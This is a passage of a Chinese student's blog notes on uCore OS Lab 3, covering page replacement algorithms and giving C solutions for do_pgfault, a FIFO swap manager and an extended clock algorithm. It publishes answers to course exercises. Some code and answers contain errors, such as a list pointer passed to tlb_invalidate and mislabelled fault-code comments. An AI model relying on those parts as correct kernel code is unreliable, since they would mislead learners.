<li>缺页时，从指针当前位置顺序检查环形链表。
<ul>
<li>若当前遍历到的页面访问位为0，则<strong>置换该页</strong></li>
<li>若当前遍历到的页面访问位为1，则<strong>设置该页的访问位为0</strong>，并移动指针到下一个页面，直到找到可置换的页面。</li>
</ul>
</li>
</ul>
<h4 id="II-全局置换算法">II. 全局置换算法</h4>
<ul>
<li>思路：全局置换算法为进程分配可变数目的物理页面。</li>
<li>要解决的问题：
<ul>
<li>进程在不同阶段的内存需求是有变化的。</li>
<li>分配给进程的内存也需要在不同阶段有所变化。</li>
<li>全局置换算法需要确定分配给进程的物理页面数。</li>
</ul>
</li>
<li>CPU利用率与并发进程数存在相互制约的关系。
<ul>
<li>进程数少时，提高并发进程数，可提高CPU利用效率。</li>
<li>并发进程导致内存访问增加</li>
<li>并发进程的内存访问会降低了访存的局部性特征。</li>
<li>局部性特征的下降会导致缺页率上升和CPU利用率下降。</li>
</ul>
</li>
</ul>
<h5 id="1-工作集置换算法">1) 工作集置换算法</h5>
<h6 id="a-工作集与常驻集">a. 工作集与常驻集</h6>
<ul>
<li><strong>工作集</strong>是一个进程当前正在使用的<strong>逻辑页面</strong>集合，可表示为二元函数$W(t, \Delta)$
<ul>
<li>$t$是当前的执行时刻</li>
<li>$\Delta$ 称为<strong>工作集窗口</strong>(working-set window)，即一个定长的页面访问时间的窗口。</li>
<li>$W(t, \Delta)$指在当前时刻$t$前的$\Delta$时间窗口中的<strong>所有访问页面</strong>所组成的集合。</li>
<li>$|W(t, \Delta)|$指工作集的大小，即页面数目。</li>
</ul>
</li>
<li><strong>常驻集</strong>是当前时刻进程<strong>实际驻留</strong>在内存中的页面集合。</li>
<li>工作集与常驻集的关系
<ul>
<li>工作集是进程在运行过程中固有的性质</li>
<li>常驻集取决于系统分配给进程的物理页面数目和页面置换算法。</li>
</ul>
</li>
</ul>
<h6 id="b-思路">b. 思路</h6>
<ul>
<li>
<p>当前时刻前$\tau$个内存访问的页引用是工作集。其中$\tau$被称为<strong>窗口大小</strong>。</p>
</li>
<li>
<p>换出不在工作集中的页面</p>
</li>
</ul>
<h6 id="c-具体实现">c. 具体实现</h6>
<ul>
<li>访存链表：维护窗口内的访存页面</li>
<li><strong>访存时，换出不在工作集的页面；</strong> 更新访存链表。</li>
<li>缺页时，换入页面，更新访存链表。</li>
</ul>
<h5 id="2-缺页率置换算法（PPF）">2) 缺页率置换算法（PPF）</h5>
<h6 id="a-简介-3">a. 简介</h6>
<p>通过调节常驻集大小，使每个进程的缺页率保持在一个合理的范围内。</p>
<ul>
<li>若进程缺页率过高，则增加常驻集以分配更多的物理内存</li>
<li>若进程缺页率过低，则减小常驻集以减小它的物理页面数。</li>
</ul>
<h6 id="b-具体实现-3">b. 具体实现</h6>
<ul>
<li>访存时，设置引用位标志</li>
<li>缺页时，计算从上次缺页时间$t_{last}$到现在$t_{current}$的时间间隔
<ul>
<li>如果$t_{current}-t_{last}&gt;T$，则置换所有在$[t_{last}, t_{current}]$时间内<strong>没有被引用</strong>的页。</li>
<li>如果$t_{current}-t_{last}&lt;T$，则增加缺失页到常驻集中。</li>
</ul>
</li>
</ul>
<h4 id="III-Belady现象">III. Belady现象</h4>
<ul>
<li>现象： 采用FIFO等算法时，可能出现分配的物理页面数增加，缺页次数反而升高的异常情况。</li>
<li>原因：
<ul>
<li>FIFO算法的置换特征与进程访问内存的动态特征矛盾</li>
<li>被置换出去的页面并不一定是进程近期不会访问的。</li>
</ul>
</li>
</ul>
<h3 id="3-uCore虚拟内存机制的实现">3. uCore虚拟内存机制的实现</h3>
<h4 id="I-虚拟内存管理">I. 虚拟内存管理</h4>
<ul>
<li>
<p>结构体变量<code>check_mm_struct</code>用于管理虚拟内存页面，其结构体如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// the control struct for a set of vma using the same PDT</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> mmap_list;        <span class="comment">// 按照虚拟地址顺序双向连接的虚拟页链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">mmap_cache</span>;</span> <span class="comment">// 当前使用的虚拟页地址，该成员加速页索引速度。</span></span><br><span class="line">    <span class="keyword">pde_t</span> *pgdir;                  <span class="comment">// 虚拟页对应的PDT</span></span><br><span class="line">    <span class="keyword">int</span> map_count;                 <span class="comment">// 虚拟页个数</span></span><br><span class="line">    <span class="keyword">void</span> *sm_priv;                 <span class="comment">// 用于指向swap manager的某个链表,在FIFO算法中，该双向链表用于将可交换的已分配物理页串起来</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>当分配出新的虚拟页时，程序会执行<code>insert_vma_struct</code>函数，此时虚拟页<code>vma_struct</code>就会被插入<code>mm_struct::mmap_list</code>双向链表中。</p>
</li>
<li>
<p>若程序首次访问该内存而触发缺页中断时，程序会在缺页处理程序中为该虚拟页划分出一块新的物理页。同时，还会更新<code>mm_struct::pgdir</code>上的对应页表条目，之后该页的内存访问即可正常执行。</p>
</li>
<li>
<p>在FIFO页面置换算法中，初始时，<code>mm_struct</code>中的<code>sm_priv</code>会被设置为<code>pra_list_head</code>。而<code>pra_list_head</code>是一个双向链表的起始结点，该双向链表用于将<strong>可交换的已分配物理页</strong>串起来。</p>
</li>
</ul>
<h4 id="II-页面置换">II. 页面置换</h4>
<ul>
<li>
<p><code>swap_manager</code>与<code>pmm_manager</code>类似，都设置了一个用于管理某个功能的模块。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_manager</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">     <span class="comment">/* Global initialization for the swap manager */</span></span><br><span class="line">     <span class="keyword">int</span> (*init)            (<span class="keyword">void</span>);</span><br><span class="line">     <span class="comment">/* Initialize the priv data inside mm_struct */</span></span><br><span class="line">     <span class="keyword">int</span> (*init_mm)         (struct mm_struct *mm);</span><br><span class="line">     <span class="comment">/* Called when tick interrupt occured */</span></span><br><span class="line">     <span class="keyword">int</span> (*tick_event)      (struct mm_struct *mm);</span><br><span class="line">     <span class="comment">/* Called when map a swappable page into the mm_struct */</span></span><br><span class="line">     <span class="keyword">int</span> (*map_swappable)   (struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page *page, <span class="keyword">int</span> swap_in);</span><br><span class="line">     <span class="comment">/* When a page is marked as shared, this routine is called to</span></span><br><span class="line"><span class="comment">      * delete the addr entry from the swap manager */</span></span><br><span class="line">     <span class="keyword">int</span> (*set_unswappable) (struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr);</span><br><span class="line">     <span class="comment">/* Try to swap out a page, return then victim */</span></span><br><span class="line">     <span class="keyword">int</span> (*swap_out_victim) (struct mm_struct *mm, struct Page **ptr_page, <span class="keyword">int</span> in_tick);</span><br><span class="line">     <span class="comment">/* check the page relpacement algorithm */</span></span><br><span class="line">     <span class="keyword">int</span> (*check_swap)(<span class="keyword">void</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>若使用FIFO页面置换算法，则在缺页中断程序中，程序只会<strong>换入</strong>目标物理页，而不会主动换出。</p>
<p>只有在分配空闲物理页时，若<code>pmm_manager-&gt;alloc_pages(n)</code>失败，则程序才会执行一次页面换出，以腾出空闲的物理页，并重新分配。</p>
</li>
<li>
<p><code>swap_in</code>函数只会将目标物理页加载进内存中，而不会修改页表条目。所以相关的标志位设置必须在<code>swap_in</code>函数的外部手动处理。而<code>swap_out</code>函数会先执行<code>swap_out_victim</code>，找出最适合换出的物理页，并将其换出，最后刷新TLB。需要注意的是<code>swap_out</code>函数会在函数内部设置PTE，当某个页面被换出后，PTE会被设置为所换出物理页在硬盘上的偏移。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">cprintf(<span class="string">"swap_out: i %d, store page in vaddr 0x%x to disk swap entry %d\n"</span>, i, v, page-&gt;pra_vaddr/PGSIZE+<span class="number">1</span>);</span><br><span class="line">*ptep = (page-&gt;pra_vaddr/PGSIZE+<span class="number">1</span>)&lt;&lt;<span class="number">8</span>;</span><br><span class="line">free_page(page);</span><br></pre></td></tr></table></figure>
<p>当PTE所对应的物理页存在于内存中，那么该PTE就是正常的页表条目，可被CPU直接寻址用于转换地址。但当所对应的物理页不在内存时，该PTE就成为<code>swap_entry_t</code>，保存该物理页数据在外存的偏移位置。相关代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * swap_entry_t</span></span><br><span class="line"><span class="comment"> * --------------------------------------------</span></span><br><span class="line"><span class="comment"> * |         offset        |   reserved   | 0 |</span></span><br><span class="line"><span class="comment"> * --------------------------------------------</span></span><br><span class="line"><span class="comment"> *           24 bits            7 bits    1 bit</span></span><br><span class="line"><span class="comment"> * /</span></span><br><span class="line"><span class="comment"> /* *</span></span><br><span class="line"><span class="comment"> * swap_offset - takes a swap_entry (saved in pte), and returns</span></span><br><span class="line"><span class="comment"> * the corresponding offset in swap mem_map.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swap_offset(entry) (&#123;                                       \</span></span><br><span class="line">               <span class="keyword">size_t</span> __offset = (entry &gt;&gt; <span class="number">8</span>);                        \</span><br><span class="line">               <span class="keyword">if</span> (!(__offset &gt; <span class="number">0</span> &amp;&amp; __offset &lt; max_swap_offset)) &#123;    \</span><br><span class="line">                    panic(<span class="string">"invalid swap_entry_t = %08x.\n"</span>, entry);    \</span><br><span class="line">               &#125;                                                    \</span><br><span class="line">               __offset;                                            \</span><br><span class="line">          &#125;)</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>同时，不是所有物理页面都可以置换，例如内核关键代码和数据等等，所以在分配物理页时，需要对于那些可被置换的物理页执行<code>swap_map_swappable</code>函数，将该物理页加入到<code>mm_struct::sm_priv</code>指针所指向的双向链表中，换入和换出操作都会操作该链表（插入/移除<strong>可交换的已分配</strong>物理页）。</p>
</li>
<li>
<p>数据结构<code>Page</code>和<code>vma_struct</code>分别用于管理物理页和虚拟页，其结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于描述某个虚拟页的结构</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">vm_mm</span>;</span> <span class="comment">// 管理该虚拟页的mm_struct</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_start;      <span class="comment">// 虚拟页起始地址，包括当前地址  </span></span><br><span class="line">    <span class="keyword">uintptr_t</span> vm_end;        <span class="comment">// 虚拟页终止地址，不包括当前地址（地址前闭后开）  </span></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags;       <span class="comment">// 相关标志位</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> list_link;  <span class="comment">// 用于连接各个虚拟页的双向指针</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数据结构Page相关成员的用途已在uCore-2中介绍过，这里只提它新增的两个成员pra_*</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> ref;</span><br><span class="line">    <span class="keyword">uint32_t</span> flags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;</span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;</span><br><span class="line">    <span class="keyword">list_entry_t</span> pra_page_link;     <span class="comment">// 用于连接上一个和下一个*可交换已分配*的物理页</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> pra_vaddr;            <span class="comment">// 用于保存该物理页所对应的虚拟地址。</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当分配某个虚拟页<code>vma_struct</code>时，程序会在<code>insert_vma_struct</code>函数中设置其<code>vm_mm</code>成员为某个<code>mm_struct</code>，这样便于后续的管理。</li>
<li>在函数<code>pgdir_alloc_page</code>中，程序会设置<code>Page</code>的<code>pra_vaddr</code>成员，将其设置为当前物理页所对应的虚拟地址，之后便可通过<code>Page-&gt;pra_vaddr-&gt;pte</code>一条链，直接找到当前<strong>物理页</strong>地址所对应的PTE条目。同时，也可通过<code>pra_vaddr</code>来确定对应外存的相对偏移<code>page-&gt;pra_vaddr/PGSIZE+1</code>。</li>
<li><code>Page::page_link</code>用于将空闲物理页连接至双向链表中，而<code>page::pra_page_link</code>用于将<strong>可交换的已分配</strong>物理页连接至另一个双向链表中，注意两者的用途是不同的。</li>
</ul>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="1-练习0">1. 练习0</h3>
<blockquote>
<p><strong>填写已有实验</strong></p>
</blockquote>
<ul>
<li>抄就对了。</li>
</ul>
<h3 id="2-练习1">2. 练习1</h3>
<blockquote>
<p><strong>给未被映射的地址映射上物理页</strong></p>
<p>完成do_pgfault（mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限 的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表。</p>
</blockquote>
<p>实验代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_pgfault</span><span class="params">(struct mm_struct *mm, <span class="keyword">uint32_t</span> error_code, <span class="keyword">uintptr_t</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = -E_INVAL;</span><br><span class="line">    <span class="comment">// 获取触发pgfault的虚拟地址所在虚拟页</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vma_struct</span> *<span class="title">vma</span> = <span class="title">find_vma</span>(<span class="title">mm</span>, <span class="title">addr</span>);</span></span><br><span class="line"></span><br><span class="line">    pgfault_num++;</span><br><span class="line">    <span class="comment">// 如果当前访问的虚拟地址不在已经分配的虚拟页中</span></span><br><span class="line">    <span class="keyword">if</span> (vma == <span class="literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;</span><br><span class="line">        cprintf(<span class="string">"not valid addr %x, and  can not find it in vma\n"</span>, addr);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 检测错误代码。这里的检测不涉及特权判断。</span></span><br><span class="line">    <span class="keyword">switch</span> (error_code &amp; <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 写，同时存在物理页，则写时复制</span></span><br><span class="line">        <span class="comment">// 需要注意的是，default会执行case2的代码，也就是判断是否有写权限。</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="comment">// 读，同时不存在物理页</span></span><br><span class="line">        <span class="comment">// 同时如果当前操作是写入，但所在虚拟页不允许写入</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;</span><br><span class="line">            cprintf(<span class="string">"do_pgfault failed: error code flag = write AND not present, but the addr's vma cannot write\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* error code flag : (W/R=0, P=1): read, present */</span></span><br><span class="line">        <span class="comment">// 读，同时存在物理页。那就不可能会调用page fault，肯定哪里有问题，直接failed</span></span><br><span class="line">        cprintf(<span class="string">"do_pgfault failed: error code flag = read AND present\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* error code flag : (W/R=0, P=0): read, not present */</span></span><br><span class="line">        <span class="comment">// 写，同时不存在物理页面</span></span><br><span class="line">        <span class="comment">// 如果当前操作是读取，但所在虚拟页不允许读取或执行</span></span><br><span class="line">        <span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;</span><br><span class="line">            cprintf(<span class="string">"do_pgfault failed: error code flag = read AND not present, but the addr's vma cannot read or exec\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 设置页表条目所对应的权限</span></span><br><span class="line">    <span class="keyword">uint32_t</span> perm = PTE_U;</span><br><span class="line">    <span class="keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;</span><br><span class="line">        perm |= PTE_W;</span><br><span class="line">    &#125;</span><br><span class="line">    addr = ROUNDDOWN(addr, PGSIZE);</span><br><span class="line">    ret = -E_NO_MEM;</span><br><span class="line">    <span class="keyword">pte_t</span> *ptep=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* LAB3 EXERCISE 1: YOUR CODE */</span></span><br><span class="line">    <span class="comment">// 查找当前虚拟地址所对应的页表项</span></span><br><span class="line">    <span class="keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="number">1</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cprintf(<span class="string">"get_pte in do_pgfault failed\n"</span>);</span><br><span class="line">        <span class="keyword">goto</span> failed;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果这个页表项所对应的物理页不存在，则</span></span><br><span class="line">    <span class="keyword">if</span> (*ptep == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 分配一块物理页，并设置页表项</span></span><br><span class="line">        <span class="keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">            cprintf(<span class="string">"pgdir_alloc_page in do_pgfault failed\n"</span>);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">/* LAB3 EXERCISE 2: YOUR CODE */</span></span><br><span class="line">        <span class="comment">// 如果这个页表项所对应的物理页存在，但不在内存中</span></span><br><span class="line">        <span class="comment">// 如果swap已经初始化完成</span></span><br><span class="line">        <span class="keyword">if</span>(swap_init_ok) &#123;</span><br><span class="line">            struct Page *page=<span class="literal">NULL</span>;</span><br><span class="line">            <span class="comment">// 将目标数据加载到某块新的物理页中。</span></span><br><span class="line">            <span class="comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span></span><br><span class="line">            <span class="keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="number">0</span>) &#123;</span><br><span class="line">                cprintf(<span class="string">"swap_in in do_pgfault failed\n"</span>);</span><br><span class="line">                <span class="keyword">goto</span> failed;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span></span><br><span class="line">            page_insert(mm-&gt;pgdir, page, addr, perm);</span><br><span class="line">            <span class="comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span></span><br><span class="line">            swap_map_swappable(mm, addr, page, <span class="number">1</span>);</span><br><span class="line">            page-&gt;pra_vaddr = addr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            cprintf(<span class="string">"no swap_init_ok but ptep is %x, failed\n"</span>,*ptep);</span><br><span class="line">            <span class="keyword">goto</span> failed;</span><br><span class="line">        &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   ret = <span class="number">0</span>;</span><br><span class="line">failed:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。
<ul>
<li>PTE结构与其标志位用途，请移步<a href="/2020/08/uCore-2#d-%E8%99%9A%E6%8B%9F%E9%A1%B5%E8%A1%A8%E7%BB%93%E6%9E%84">uCore Lab2 - 虚拟页表结构</a></li>
</ul>
</li>
<li>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？
<ul>
<li>将发生错误的线性地址（虚拟地址）保存至CR2寄存器中。</li>
<li>压入<code>EFLAGS</code>，<code>CS</code>, <code>EIP</code>，错误码和中断号至当前内核栈中。</li>
<li>保存上下文。</li>
<li>执行新的缺页中断程序。</li>
<li>恢复上下文。</li>
<li>继续执行上一级的缺页服务例程。</li>
</ul>
</li>
</ul>
<h3 id="3-练习2">3. 练习2</h3>
<blockquote>
<p><strong>补充完成基于FIFO的页面替换算法</strong></p>
<p>完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_victim函数。</p>
</blockquote>
<ul>
<li>
<p><code>FIFO</code>中，当新加入一个物理页时，我们只需将该物理页加入至链表首部即可。当需要换出某个物理页时，选择链表末尾的物理页即可。</p>
</li>
<li>
<p>相关实现如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_map_swappable(struct mm_struct *mm, <span class="keyword">uintptr_t</span> addr, struct Page   *page, <span class="keyword">int</span> swap_in)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);</span><br><span class="line"></span><br><span class="line">    assert(entry != <span class="literal">NULL</span> &amp;&amp; head != <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">//record the page access situlation</span></span><br><span class="line">    <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span></span><br><span class="line">    <span class="comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span></span><br><span class="line">    list_add(head, entry);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">         assert(head != <span class="literal">NULL</span>);</span><br><span class="line">     assert(in_tick==<span class="number">0</span>);</span><br><span class="line">     <span class="comment">/* Select the victim */</span></span><br><span class="line">     <span class="comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span></span><br><span class="line">     <span class="comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span></span><br><span class="line">     <span class="comment">//(2)  assign the value of *ptr_page to the addr of this page</span></span><br><span class="line">     <span class="keyword">list_entry_t</span> *le = head-&gt;prev;</span><br><span class="line">     assert(head!=le);</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span></span><br><span class="line">     list_del(le);</span><br><span class="line">     assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">     *ptr_page = p;</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>如果要在ucore上实现&quot;extended clock页替换算法&quot;请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题</p>
<ul>
<li>现有的swap_manager框架可以支持在ucore中实现此算法，具体见<strong>扩展练习1</strong>。</li>
<li>需要被换出的页的特征是什么？
<ul>
<li><code>PTE_P</code>(Present)和<code>PTE_D</code>(Dirty)位均为0。</li>
</ul>
</li>
<li>在ucore中如何判断具有这样特征的页？
<ul>
<li>获取线性地址所对应的页表项，之后使用位运算判断<code>PTE_P</code>和<code>PTE_D</code>。</li>
</ul>
</li>
<li>何时进行换入和换出操作？
<ul>
<li>缺页时换入。</li>
<li>物理页帧满时换出，不过需要注意dirtybit的处理。可以在修改dirty的时候写入外存，或者可以在最终要删除该物理页时再写入外存。后者有利于多个写操作的合并，降低缺页代价，但此时的页替换算法却退化成普通的clock算法，而不是extended clock算法了。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="4-扩展练习">4. 扩展练习</h3>
<h4 id="Challenge-1">Challenge 1</h4>
<blockquote>
<p><strong>实现识别dirty bit的 extended clock页替换算法</strong></p>
</blockquote>
<ul>
<li>
<p>在<code>FIFO</code>的基础上，实现<code>swap_out_victim</code>函数即可。</p>
</li>
<li>
<p>该函数中查找一块可用于换出的物理页，最多只需要遍历三次：</p>
<ul>
<li>第一次查找 !PTE_A &amp; !PTE_D，同时重置当前页的PTE_A，为第二次遍历的条件打基础</li>
<li>第二次查找 !PTE_A &amp; !PTE_D， 同时重置当前页的PTE_D，为第三次遍历的条件打基础</li>
<li>第三次查找，肯定能找到</li>
</ul>
</li>
<li>
<p>这里需要注意对于<code>PTE_D</code>的操作，若第一次、第二次遍历都找不到符合要求的物理页，则必须对<code>PTE_D</code>下手，重置该标志位。还有一点需要注意，在每次修改PTE标志位后，都需要重置TLB缓存。</p>
</li>
<li>
<p><code>swap_out_victim</code>相关代码如下（偷了个小懒，每次遍历链表都是从头开始，同时其余函数沿用<code>FIFO</code>）：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">_extend_clock_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="keyword">int</span> in_tick)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">list_entry_t</span> *head=(<span class="keyword">list_entry_t</span>*) mm-&gt;sm_priv;</span><br><span class="line">        assert(head != <span class="literal">NULL</span>);</span><br><span class="line">    assert(in_tick==<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 第一次查找 !PTE_A &amp; !PTE_D，同时重置当前页的PTE_A</span></span><br><span class="line">    <span class="comment">// 第二次查找 !PTE_A &amp; !PTE_D， 同时重置当前页的PTE_D</span></span><br><span class="line">    <span class="comment">// 第三次查找，肯定能找到</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">list_entry_t</span> *le = head-&gt;prev;</span><br><span class="line">        assert(head!=le);</span><br><span class="line">        <span class="keyword">while</span>(le != head)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">p</span> = <span class="title">le2page</span>(<span class="title">le</span>, <span class="title">pra_page_link</span>);</span></span><br><span class="line">            <span class="keyword">pte_t</span>* ptep = get_pte(mm-&gt;pgdir, p-&gt;pra_vaddr, <span class="number">0</span>);</span><br><span class="line">            <span class="comment">// 如果满足未使用未修改这两个条件，则直接分配</span></span><br><span class="line">            <span class="keyword">if</span>(!(*ptep &amp; PTE_A) &amp;&amp; !(*ptep &amp; PTE_D))</span><br><span class="line">            &#123;</span><br><span class="line">                list_del(le);</span><br><span class="line">                assert(p !=<span class="literal">NULL</span>);</span><br><span class="line">                *ptr_page = p;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 如果在第一次查找中，访问到了一个已经使用过的PTE，则标记为未使用。</span></span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>)</span><br><span class="line">                *ptep &amp;= ~PTE_A;</span><br><span class="line">            <span class="comment">// 如果在第二次查找中，访问到了一个已修改过的PTE，则标记为未修改。</span></span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i == <span class="number">1</span>)</span><br><span class="line">                *ptep &amp;= ~PTE_D;</span><br><span class="line"></span><br><span class="line">            le = le-&gt;prev;</span><br><span class="line">            <span class="comment">// 遍历了一回，肯定修改了标志位，所以要刷新TLB</span></span><br><span class="line">            tlb_invalidate(mm-&gt;pgdir, le);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 按照前面的assert与if，不可能会执行到此处，所以return -1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">swap_manager</span> <span class="title">swap_manager_fifo</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     .name            = <span class="string">"extend_clock swap manager"</span>,</span><br><span class="line">     .init            = &amp;_fifo_init,</span><br><span class="line">     .init_mm         = &amp;_fifo_init_mm,</span><br><span class="line">     .tick_event      = &amp;_fifo_tick_event,</span><br><span class="line">     .map_swappable   = &amp;_fifo_map_swappable,</span><br><span class="line">     .set_unswappable = &amp;_fifo_set_unswappable,</span><br><span class="line">     .swap_out_victim = &amp;_extend_clock_swap_out_victim,</span><br><span class="line">     .check_swap      = &amp;_fifo_check_swap,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="Challenge-2">Challenge 2</h4>
<blockquote>
